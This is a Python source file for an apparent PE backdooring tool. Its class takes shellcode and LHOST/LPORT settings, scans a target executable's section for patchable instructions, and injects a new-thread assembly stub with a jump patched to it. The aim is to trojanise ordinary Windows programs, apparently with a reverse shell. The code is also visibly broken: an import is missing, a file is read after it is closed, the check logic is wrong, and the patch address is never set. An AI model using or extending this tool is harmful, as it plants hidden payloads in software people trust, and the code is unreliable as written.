# coding:utf-8

import sys
import os
import subprocess
import pepatch
import pefile
from capstone import *

class pebin():
    """
    PE binary class.
    """
    def __init__(self, FILE, OUTPUT, APPEND_SECTION, SHELLCODE, LHOST, LPORT, NEW_THREAD, CFLAGS):
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.APPEND_SECTION = APPEND_SECTION
        self.SHELLCODE = SHELLCODE
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.NEW_THREAD = NEW_THREAD
        self.CFLAGS = CFLAGS
        self.FILE_ = []

    def support_check(self):
        # check this file if is support
        with open(self.FILE, 'rb') as f:
            f.seek(0)
        magic = f.read(2)
        if magic != '\x4d\x5a':
            print("This is not a PE FIlE.")
            print("This file is supported.")

    def run_this(self):
        if self.APPEND_SECTION is True:
            self.append_section()
            sys.exit()

    def gather_file_info_win(self):
        pass

    def append_section(self):

        patch_address = None
        section_test_rawdata = ""
        valid_opt = []

        lief_binary = lief.parse(self.FILE)
        section_test = lief_binary.get_section(".test")
        section_test_content = section_test.content
        for _byte in section_test_content:
            section_test_rawdata += chr(_byte)
        # patch_address_offset = patch_address - lief_binary.optional_header.imagebase - section_test.virtual_address
        md = Cs(CS_ARCH_X86, CS_MODE_32)

        # here can use module logging
        print("Here is valid address")
        # _code (id, address, mnemonic, op_str, size, bytes)
        for _code in md.disasm(section_test_rawdata, lief_binary.optional_header.imagebase + section_test.virtual_address):
            if _code.size == 5:
                valid_opt.append((_code.address, _code.mnemonic, _code.op_str))
                print("0x{0:x}\t{1:s}\t{2:s}".format(_code.address, _code.mnemonic, _code.op_str))
        if self.NEW_THREAD:
            # pepatcher.Patcher(target, cflags)
            pt = pepatch.Patcher(self.FILE)
            with open(".\\shellcode\\asm\\create_thread.asm", 'r') as f:
                create_thread_asm = f.read()
                create_thread_asm += ''
            addr = pt.inject(asm=create_thread_asm)
            pt.patch(patch_address, jmp=addr)

        pepatch.Patcher()